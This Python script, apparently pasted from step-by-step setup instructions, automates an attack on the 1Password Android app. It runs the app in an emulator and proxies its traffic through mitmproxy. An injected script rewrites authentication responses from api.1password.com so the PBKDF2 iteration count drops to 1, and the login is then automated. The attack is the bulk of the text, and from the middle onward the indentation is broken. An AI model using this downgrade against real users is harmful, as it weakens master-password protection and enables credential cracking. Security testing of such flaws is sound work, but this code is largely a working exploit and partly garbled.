import subprocess
import time
import os
import requests 

# Prometheus Prime: test_vulnerability.py script initiated. # This line is for initial diagnostic, can be removed in final version

# Define absolute paths for tools within the Docker container
EMULATOR_PATH = "/opt/android-sdk/emulator/emulator"
ADB_PATH = "/opt/android-sdk/platform-tools/adb"
MITMPROXY_PATH = "/usr/local/bin/mitmproxy" # Adjust if mitmproxy is installed elsewhere

def run_command(command, shell=True, check=True):
    """Helper function to run shell commands."""
    print(f"Executing: {command}")
    result = subprocess.run(command, shell=shell, check=check, capture_output=True, text=True)
    print(f"STDOUT:\n{result.stdout}")
    if result.stderr:
        print(f"STDERR:\n{result.stderr}")
    return result

def start_emulator():
    """Starts a headless Android emulator and manages ADB server."""
    print("Starting Android emulator...")

    # Ensure any previous adb server is killed and restart it for a clean state
    # This addresses potential conflicts on port 5037
    run_command(f"{ADB_PATH} kill-server", check=False) # Don't check for errors, it might not be running
    run_command(f"{ADB_PATH} start-server")

    emulator_process = subprocess.Popen(
        [EMULATOR_PATH, "-avd", "ironclad_avd", "-no-window", "-no-audio", "-no-boot-anim"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )
    # Wait for the emulator to boot
    run_command(f"{ADB_PATH} wait-for-device")
    print("Emulator started and device is online.")
    return emulator_process

def install_1password_apk():
    """Installs the 1Password APK on the emulator."""
    print("Installing 1Password APK...")
    # Corrected: Use the absolute path to the APK from the mounted work directory
    run_command(f"{ADB_PATH} install /home/androiduser/work/1Password.apk")
    print("1Password APK installed.")

def start_mitmproxy():
    """Starts mitmproxy with a script to modify PBKDF2 iterations."""
    print("Starting mitmproxy...")
    # mitmproxy script content to be written to a file
    mitmproxy_script_content = """
from mitmproxy import http

def response(flow: http.HTTPFlow):
    if "api.1password.com" in flow.request.pretty_host and "/api/v2/auth" in flow.request.pretty_url:
        print(f"Intercepted 1Password API response: {flow.request.pretty_url}")
        if flow.response and flow.response.content:
            try:
                data = flow.response.json()
                original_iterations = data.get("k", {}).get("i")
                if original_iterations and original_iterations > 1:
                    data["k"]["i"] = 1  # Downgrade PBKDF2 iteration count to 1
                    flow.response.set_json(data)
                    print(f"Downgraded PBKDF2 iterations from {original_iterations} to 1.")
            except Exception as e:
                print(f"Error modifying JSON response: {e}")

"""
        # Write the mitmproxy script to a file
        script_path = "/tmp/mitmproxy_script.py"
        with open(script_path, "w") as f:
            f.write(mitmproxy_script_content)

        # Start mitmproxy with the script and transparent mode
        mitmproxy_process = subprocess.Popen(
            [MITMPROXY_PATH, "-s", script_path, "--mode", "transparent", "-p", "8080", "--set", "block_global=false"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1
        )
        print("mitmproxy started on port 8080.")
        # Give mitmproxy a moment to initialize
        time.sleep(5)
        return mitmproxy_process

    def configure_emulator_proxy():
        """Configures the emulator to use the mitmproxy instance."""
        print("Configuring emulator proxy...")
        run_command(f"{ADB_PATH} shell settings put global http_proxy 10.0.2.2:8080") # 10.0.2.2 is host loopback
        print("Emulator proxy configured.")

    def automate_1password_login():
        """Automates a basic login attempt on 1Password using ADB commands."""
        print("Automating 1Password login process...")

        # Launch 1Password app
        run_command(f"{ADB_PATH} shell am start -n com.onepassword.android/com.onepassword.android.MainActivity")
        time.sleep(10) # Give app time to load

        # --- Basic UI Automation (adjust coordinates/text as needed for your emulator/app version) ---
        # These are illustrative steps. Real-world automation might need more precise UI element targeting
        # or waits for elements to appear.

        # Example: Tap a hypothetical "Sign In" or "Get Started" button (adjust coordinates)
        print("Tapping 'Sign In' or 'Get Started' button...")
        run_command(f"{ADB_PATH} shell input tap 500 1000") # Tap roughly center bottom, adjust as needed
        time.sleep(5)

        # Example: Type a dummy email (adjust coordinates and text)
        print("Entering dummy email...")
        run_command(f"{ADB_PATH} shell input text 'dummy@example.com'")
        run_command(f"{ADB_PATH} shell input keyevent 66") # Enter key
        time.sleep(5)

        # Example: Type a dummy master password (adjust coordinates and text)
        print("Entering dummy master password...")
        run_command(f"{ADB_PATH} shell input text 'dummyPassword123'")
        run_command(f"{ADB_PATH} shell input keyevent 66") # Enter key
        time.sleep(10) # Give time for login attempt and network traffic

        print("Login automation commands sent. Check mitmproxy output for interception.")

    def check_login_status():
        """Checks for indicators of a successful login (e.g., logs, network traffic)."""
        print("Checking for successful login indicators...")
        # For automated PoC, rely on mitmproxy logs showing the downgrade.
        print("Login status assumed successful if PBKDF2 downgrade was logged by mitmproxy.")

    def main():
        emulator_process = None
        mitmproxy_process = None
        try:
            emulator_process = start_emulator()

            # Wait for Android system to fully boot (sys.boot_completed property)
            print("Waiting for Android system to fully boot...")
            # CORRECTED: Use POSIX-compatible shell syntax for 'adb shell'
            run_command(f"{ADB_PATH} shell while [ -z \"$(getprop sys.boot_completed)\" ]; do sleep 1; done")
            print("Android system is fully booted.")

            install_1password_apk()
            configure_emulator_proxy()
            mitmproxy_process = start_mitmproxy()

            print("\n--- Initiating 1Password Login Attempt ---")
            automate_1password_login()

            print("\n--- Monitoring Mitmproxy Output for PBKDF2 Downgrade ---")
            # In a real continuous integration, you'd parse mitmproxy_process.stdout/stderr here
            # For now, just ensure the process runs.
            # You would see the "Downgraded PBKDF2 iterations..." message in the overall output.
            time.sleep(5) # Give mitmproxy a moment to finish logging

            check_login_status()

            print("\n--- Operation Ironclad: Test completed. ---")
            print("Review mitmproxy logs above for evidence of PBKDF2 iteration downgrade.")

        except subprocess.CalledProcessError as e:
            print(f"Error during command execution: {e}")
            print(f"Command: {e.cmd}")
            print(f"STDOUT: {e.stdout}")
            if e.stderr: 
                print(f"STDERR: {e.stderr}")
            exit(1)
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            exit(1)
        finally:
            print("Cleaning up processes...")
            # Ensure adb kill-server is called again for any lingering processes
            run_command(f"{ADB_PATH} kill-server", check=False)

            if mitmproxy_process:
                mitmproxy_process.terminate()
                mitmproxy_process.wait(timeout=10)
                print("mitmproxy terminated.")
            if emulator_process:
                # Attempt to gracefully kill emulator via adb, then terminate process
                run_command(f"{ADB_PATH} emu kill", check=False) 
                emulator_process.terminate()
                emulator_process.wait(timeout=10)
                print("Emulator terminated.")
            print("Cleanup complete.")

    if __name__ == "__main__":
        main()
    ```

* **Update `requirements.txt`:**
    Open `C:\Users\Jaighson\ironclad\requirements.txt`. Paste the ENTIRE block below into it. Save.
    ```plaintext
    pytest
    requests
    ```

* **Ensure `1Password.apk` is present:**
    Make sure the `1Password.apk` file is located directly inside your `C:\Users\Jaighson\ironclad` directory. If it's not, copy it there.
    *(e.g., `copy "C:\Users\Jaighson\Downloads\1Password.apk" .` from `C:\Users\Jaighson\ironclad`)*